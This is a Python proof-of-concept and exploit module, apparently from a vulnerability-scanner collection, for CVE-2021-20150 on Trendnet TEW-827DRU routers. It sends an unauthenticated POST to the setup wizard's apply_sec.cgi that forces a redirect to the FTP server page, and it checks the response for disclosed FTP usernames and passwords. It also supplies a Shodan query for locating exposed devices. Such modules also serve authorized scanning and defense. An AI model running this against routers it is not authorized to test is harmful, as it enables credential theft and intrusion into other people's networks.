import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Trendnet AC2600 TEW-827DRU - Credentials Disclosure''',
        "description": '''Trendnet AC2600 TEW-827DRU version 2.08B01 improperly discloses information via redirection from the setup wizard. Authentication can be bypassed and a user may view information as Admin by manually browsing to the setup wizard and forcing it to redirect to the desired page.''',
        "severity": "medium",
        "references": [
            "https://www.tenable.com/security/research/tra-2021-54", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-20150"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-20150",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.html:"TEW-827DRU"'''
        },
        "tags": ["cve", "cve2021", "trendnet", "disclosure", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/apply_sec.cgi"""
        method = "POST"
        data = """action=setup_wizard_cancel&html_response_page=ftpserver.asp&html_response_return_page=ftpserver.asp"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""ftp_username""" in resp0.text and """ftp_password""" in resp0.text and """ftp_permission""" in resp0.text and """TEW-827DRU""" in resp0.text) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url